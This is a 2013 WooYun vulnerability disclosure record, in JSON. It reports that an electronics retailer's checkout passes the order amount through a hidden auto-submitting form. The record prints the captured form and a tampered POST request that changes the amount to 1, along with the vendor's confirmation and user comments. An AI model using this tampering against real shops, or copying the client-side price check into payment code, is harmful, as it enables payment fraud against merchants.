{"id": 12863, "wybug_id": "wooyun-2013-020783", "wybug_title": "绿森数码订单支付漏洞，买个MacPro送小胖子", "wybug_corp": "浙江绿森数码科技有限公司", "wybug_author": "se55i0n", "wybug_date": "2013-03-28 13:36", "wybug_open_date": "2013-05-12 13:37", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感操作逻辑错误", "点卡", "支付行业敏感", "敏感操作校验不足", "支付安全", "支付漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-12：\t细节向公众公开  简要描述： 礼物贴! @小胖子 哥写的地址是你勒，注意查收：） 详细说明：  1）选了个最高的电脑，当然舍MacPro其谁；\n\n2）直接提交订单，在这过程中是木有问题的；\n\n3）订单生成之后，返回页面查看我们的订单信息，都是没有问题的；\n\n4）好吧，点击立即付款并抓包，发现居然是一个奇葩的设计呀，look；\n<form id=\"PostForm\" action=\"https://netpay.cmbchina.com/netpayment/BaseHttp.dll?PrePayC1\" method=\"POST\"><input type=\"hidden\" name=\"BranchID\" value=\"0571\"><input type=\"hidden\" name=\"CoNo\" value=\"000070\"><input type=\"hidden\" name=\"BillNo\" value=\"3475645944\"><input type=\"hidden\" name=\"Amount\" value=\"20466.00\"><input type=\"hidden\" name=\"Date\" value=\"20130327\"><input type=\"hidden\" name=\"MerchantUrl\" value=\"http://www.lusen.com/PayMerchantReturn.axd\"></form><script language=\"javascript\">    var vPostForm = document.getElementById('PostForm');vPostForm.submit();</script>\n5）中间环节居然多了个submit提交的form表单，果断将Amount改为“1”，这才到了下面的环节；\nPOST /netpayment/BaseHttp.dll?PrePayC1 HTTP/1.1Host: netpay.cmbchina.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.lusen.com/Pay.axd?t=3C3F6B94351AC96FAD2623F44C10A590Cookie: ...Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 132BranchID=0571&CoNo=000070&BillNo=3475645944&Amount=1.00&Date=20130327&MerchantUrl=http%3A%2F%2Fwww.lusen.com%2FPayMerchantReturn.axd\n6) 素不素，这样MacPro就到手了：D；\n\nPS：礼物的，有木有？   漏洞证明：  见详细说明   修复方案：     版权声明：转载请注明来源 se55i0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-28 17:19 厂商回复： 谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-28 15:54 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  发货没有呀！    \n     2013-03-28 17:11 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:136        | 心在，梦在)\t\t \n  @lucky 哈哈，这个问@小胖子..同问    \n     2013-03-28 17:34 |    \t\t陈再胜 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:13        | 微博收收听~~~●﹏●)\t\t \n  买个给我把···    \n     2013-03-28 17:55 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  洞主，我真的哭了，真的，躲在厕所里哭了一天，刚从厕所出来，我爱你，真的。    \n     2013-03-28 18:15 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:172        )\t\t \n  @小胖子 脚麻了没，哈哈！听闻你要婚了！    \n     2013-03-28 21:13 |    \t\tzkz \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:14        | 人生充满悲剧，淡定才是真理)\t\t \n  以后绿森的洞大家就自己留着吧！没有意义为这样的厂商提交！    \n     2013-04-03 17:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  @小胖子 太给力了    \n     2013-04-28 15:10 |    \t\tAofa \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | check it out yo)\t\t \n  @小胖子 洞主啊。你就不能等我买一个在那啥啊    \n     2013-05-12 18:35 |    \t\tz7y \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:9        | 关注技术与网络安全)\t\t \n  @小胖子 哈哈哈哈,你要被送人了！    \n     2013-08-14 13:08 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  @xsser 这个她没有证明可完成订单吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}